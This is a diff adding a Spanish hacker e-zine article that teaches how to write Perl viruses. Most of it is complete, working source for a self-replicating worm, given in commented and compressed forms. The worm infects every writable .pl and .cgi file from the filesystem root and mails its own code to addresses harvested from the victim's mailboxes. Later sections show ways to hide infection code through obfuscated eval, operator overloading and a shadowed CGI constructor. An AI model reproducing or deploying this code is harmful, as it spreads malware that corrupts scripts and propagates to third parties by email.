@@ -1,0 +1,284 @@
+-=( 7A69#12 )=--=( art8 )=--=( Virus en perl )=--=( Anarion )=-
+       
+       
+PERL VIRII
+----------
+
+Bueno siguiendo con los articulos sobre perl, hoy tratare sobre el virii en 
+perl. En realidad no se me habia ocurrido hasta que Ripe me paso un articulo 
+de la 29a sobre virii en perl, lo que pasa es que el autor no sabia mucho 
+perl asi que quizas, para aquellos que sepan mas, pueda interesarles unas 
+ideas interesantes, asi mismo adjunto algunos codigos, y un virus entero que 
+intenta infectar todos los .pl del disco duro, ademas de enviarse por correo.
+
+Como en perl no compilamos nuestro codigo, nos es facil abrir el propio codigo 
+fuente i modificarlo desde el propio programa.
+
+La primera idea que se me ocurrio es la normal, abrir $0 que es el nombre de 
+nuestro ejecutable para copiar de alli el codigo, y lo que haremos es ponerlo 
+en la primera funcion que encontremos. Este es el primer codigo que se me 
+ocurrio (voy comentando los puntos interesantes el codigo del virus mas 
+compactado estara al final del articulo):
+
+
+#!/usr/bin/perl
+;
+# Nuestra marca de que esta infectado use strict;
+#A-JapH
+unless(fork())	          
+# Creamos un proceso hijo para que siga infectando mientras
+{								     
+# El programa original seguira haciendo lo que debia
+	use File::Find;	  
+	# El modulo para recorrer el arbol d directorios
+	local (*V,*F);
+	$^W=0;		  
+	# No warnings al intentar abrir archivos etd por si usa -w
+	open V,$0;	  
+	# Abrimos nuestro propio codigo
+	my @v;
+	$_=<V> while(! /^#A-JapH/);	
+	# Marca del inicio del virus
+	push(@v,$_);
+	while (! /^#End A-JapH/)         
+	# Insertaremos hasta el final de la marca
+	{
+		$_=<V>;
+		push(@v,$_);
+	}
+	close(V);
+
+        # EL path para las pruebas lo puedes delimitar al home
+	#finddepth(\&infect,"/home/anarion/perl");  
+	# asi podemos provar como funciona el virus 
+	envia_mail(\@v) unless -e "$ENV{HOME}/.ajaph" or -e "/tmp/.$>.ajaph"; 
+        # Solo enviaremos mail una vez por usuario
+	exit;
+	# Fin
+	sub infect
+	{
+		$_=$File::Find::name;
+		if(/\.pl/ or /\.cgi/)	      
+		# Si encontramos un cgi o pl
+		{
+			if(-w and -t and -f)  
+			# Y tenemos permisos
+			{
+				open F,$_;
+				my $f=$_;
+				my $cap=<F>;
+				my $mark=<F>;
+				return if $mark =~ /^;$/ or $cap !~ /perl/i; 
+				# Buscamos la marca
+				my $funcio;
+				while(<F>)
+				{
+					$funcio=$1 and last if /sub (\w+)/;  
+					# Buscamos la primera funcion a 
+					# infectar
+				}
+				if ($funcio)
+				{
+					infecta_funcio($funcio,$f,\@v);      
+					# Infectamos la funcion
+				}
+				else
+				{
+					infecta_inici($f,\@v);		     
+					# Infectaremos el inicio
+				}
+				close(F);
+			}
+		}
+	}
+}
+
+sub infecta_funcio				
+# Infectaremos la funcion y escribimos el archivo
+{
+	my ($funcio,$f,$virus) = @_;
+	my (@infectat,$clau_inici);
+	local *F;
+	open(F,$f);
+	$_=<F>;
+	push(@infectat,"$_;\n");
+	while(! /sub $funcio/)
+	{
+		$_=<F>;
+		push(@infectat,$_);
+	}
+	
+	if (! /{\s*/)
+	{
+		push(@infectat,"{\n");
+		$clau_inici=1;
+	}
+	push(@infectat,@$virus);
+	
+	if ($clau_inici)
+	{
+		$_=<F>;
+		s/^\s*{//;
+		push(@infectat,$_);
+	}
+	
+	push(@infectat,$_) while(<F>);
+
+	open(F,">$f-infectat");
+	print F $_ for(@infectat);
+	close(F);
+}
+
+sub infecta_inici			
+# Infecta el inicio porque no usa ninguna funcion
+{
+	my ($fitxer,$virus)=@_;
+	local *F;
+	open(F,$fitxer);
+	my $capsa=<F>;
+	my @file=<F>;
+	open(F,">$fitxer-infectat");
+	print F "$capsa;\ngoto VIRUS unless fork();\n";
+	print F $_ for (@file,"\n exit;\nVIRUS:\n",@$virus,"\n");
+	close(F);
+}
+
+sub envia_mail			
+# Enviamos uns pocos correos
+{
+	my $virus=pop;
+	my (%mails,$progmail,$id);
+	local *F;
+	for("/usr/sbin/sendmail","/usr/lib/sendmail")
+	{
+		$progmail = $_ and last if -e and -x;
+	}
+	print "Enviant mails amb $progmail\n";
+	for("$ENV{MAIL}","$ENV{HOME}/mbox","$ENV{HOME}/mail/sentbox")
+	{
+		open(F,$_);
+		while (<F>)
+		{
+			$mails{"$1"}=1 if /From:.*(\S+\@\S+)/;
+			$id=$1 if /To:.*(\S+\@\S+)/;
+		}
+	}
+	
+	for (keys %mails)
+	{
+		open(F,"|$progmail");
+		print $_ for("Mail from: $id\nRcpt to: $_\nSubject: Perl Script\n\n",@$virus);
+		close(F);
+	}
+	open(F,">$ENV{HOME}/.ajaph") || open(F,"/tmp/.$>.ajaph");
+	print F "You have A-JapH Virus :)\n";
+	close(F);
+}
+#End A-JapH
+
+
+Como veis la idea es senzilla y asi mismo es bastante obvio, el codigo 
+comprimido quedaria asi:
+
+
+#!/usr/bin/perl
+;
+use strict;
+# Anarion 
+#A-JapH
+unless(fork()){use File::Find;local(*V,*F);$^W=0;open V,$0;my@v;push@v,grep{/^#A-JapH/../^#End A-JapH/}<V>;finddepth(\&i,"/");e(\@v)unless-e"$ENV{HOME}/.ajaph" or-e"/tmp/.$>-ajaph";exit;sub i{sleep 1;$_=$File::Find::name;if((/\.pl/ or /\.cgi/)and -w and -t and -f){open F,$_;my$f=$_;my$c=<F>;my$m=<F>;return if $m=~/^;$/ or$c!~/perl/i;my$u;while(<F>){$u=$1 and last if /sub (\w+)/}$u?iu($u,$f,\@v):ii($f,\@v)}}}sub iu{my($u,$f,$v)=@_;my(@i,$c);local*F;open(F,$f);$_=<F>;push(@i,"$_;\n");while(!/sub $u/){$_=<F>;push(@i,$_)}if(!/{\s*/){push(@i,"{\n");$c=1}push(@i,@$v);if($c){$_=<F>;s/^\s*{//;push(@i,$_)}push(@i,$_)while(<F>);open(F,">$f");print F $_ for(@i)}sub ii{my($f,$v)=@_;local*F;open(F,$f);my$c=<F>;my@f=<F>;open(F,">$f");print F "$c;\ngoto AJAPH unless fork();\n";print F $_ for (@f,"\n exit;\nAJAPH:\n",@$v,"\n")}sub e{my$v=pop;my(%m,$p,$i);local*F;for("/usr/sbin/sendmail","/usr/lib/sendmail"){$p=$_ and last if-e and-x}print "Enviant mails amb $p\n";for("$ENV{MAIL}","$ENV{HOME}/mbox","$ENV{HOME}/mail/sentbox"){open(F,$_);while (<F>){$m{"$1"}=1 if /From:.*(\S+\@\S+)/;$i=$1 if /To:.*(\S+\@\S+)/}}for(keys %m){open(F,"|$p -t");print F $_ for("Mail from: $i\nRcpt to: $_\nSubject: Perl Script\n\n",@$v);close(F)}open(F,">$ENV{HOME}/.ajaph")||open(F,"/tmp/.$>-ajaph");print F "You have A-JapH Virus :)\n"}
+#End A-JapH
+
+
+Pero podriamos en vez de infectar una funcion poniendo nuestro codigo al 
+inicio, podemos usar maneras mas creativas de infectar un codigo, casi sin 
+modificar el codigo fuente del programa.
+Podriamos poner en alguna parte del programa un require '/tmp/.ajaph'; o con 
+un do, y que se ejecutara asi nuestro virus una vez este infectado un pl i 
+siga con la infeccion del resto del HD, y que para enviarse por correo se 
+enviara dentro de otro archivo tal y como el primer virus que hicimos.
+Asi solo con an~adir una linea al programa nos bastaria.Quizas un require es 
+algo muy obvio, podemos ocultarlo con eval, aunque no se que seria mas 
+sospechoso podriamos hacer:
+
+  {local$_=q=require "/tmp/.ajaph"=;eval} 		
+  # Y ahora con un tr keda totalmente diferente  [:)]  {local$_=q+sfrvjsf #0unq0/bkbqi+;y+["-|]+[!-{]+;eval} 
+  # Un poco mas largo, pero no hay require  [:)]    
+
+Otra manera que se me ocurrio para poder ocultar nuestro codigo, es en vez de 
+capturar una funcion, es sobrescribir las funciones propias del perl. El perl 
+nos deja hacerlo con el overload, asi puedes podemos modificar lo que hace un 
+simple print "Hola" por cuando haga print ejecute nuestro codigo. Un ejemplo 
+sencillo de como un print crearia un directorio:
+
+use overload;
+BEGIN { 
+  overload::constant "q", sub {
+    			mkdir "Anarion",0666;
+    			return $_[1];
+  			      }
+}
+print "Hola yo soy un print\n";
+
+Asi hemos sobrescrito el operador q con lo cual un simple print puede hacer 
+cualquier cosa que nosotros queramos. Imaginad que creamos un modulo, lo 
+ponemos en el path del @INC con un overload por alli dentro o modificamos 
+algun pm y ponemos dentro un overload, imaginad ke podemos infectar el CGI.pm.
+Entonces todos ls cgis que se ejecutaran llamando a nuestro modulo trataria 
+de infectar a los otros.Lo malo de overload es que no puedes usarlo en main, 
+asi pues o lo cargamos en un begin o deberiamos definir un package nuevo y 
+sobrescribir una de las funciones desde alli, y luego la exportamos.
+
+Otra manera de abrir el codigo del mismo programa para buscar el trozo de 
+codigo que copiar al infectarse, es con el bug de __DATA__. En teoria solo 
+puedes acceder a los datos de despues de esa linea, donde se considera que el 
+programa ya deberia haber finalizado. Supongamos que ponemos un __END__ o 
+__DATA__ al final, kizas entonces con seek podemos posicionar el puntero en 
+el inicio del archivo, asi, sin usar open, podriamos leer nuestro propio 
+codigo y modificarlo o copiarlo al fichero destino dela infeccion.
+Pongo un ejemplo:
+
+#!/usr/bin/perl -w
+# 
+# codigo del programa
+use strict;
+my $sendmail='/usr/lib/sendmail';
+seek(DATA,0,0);
+print while <DATA>;
+__DATA__
+
+Pensando en otras maneras para que se ejecute nuestro codigo, pense en meterlo
+en un BEGIN {} o en un END { } asi siempre se ejecutaria, pero luego quizas 
+se veria mucho asi que se me ocurrio como hacer que un programa llame a 
+nuestra funcion y no parezca sospechoso. Viendo la sintaxis que normalmente
+usa la gente se me ocurrio lo siguiente:
+(tipico escript)
+
+#!/usr/bin/perl
+...
+use CGI;
+...
+my $query = new CGI;
+...
+
+La gente no se da cuenta que de esta manera esta llamando la funcion new del 
+modulo CGI pero de una manera indirecta, asi si ponemos unas funciones en el 
+main que se llamen asi,creamos nuestro new, y devolvemos un objeto llamando al
+new del modulo CGI, podemos hacer que se ejecute nuestro codigo y el usuario 
+no vea nada, asi pues mas adelante en el archivo ponemos unas funciones que 
+se llamen igual ...
+
+use CGI;
+
+sub new (*)
+{
+    print "Im Here!!\n";
+    my $a=CGI::->new;
+    return $a;
+}
+
+my $query = new CGI;
+print ref($query);
+
+*EOF*
+
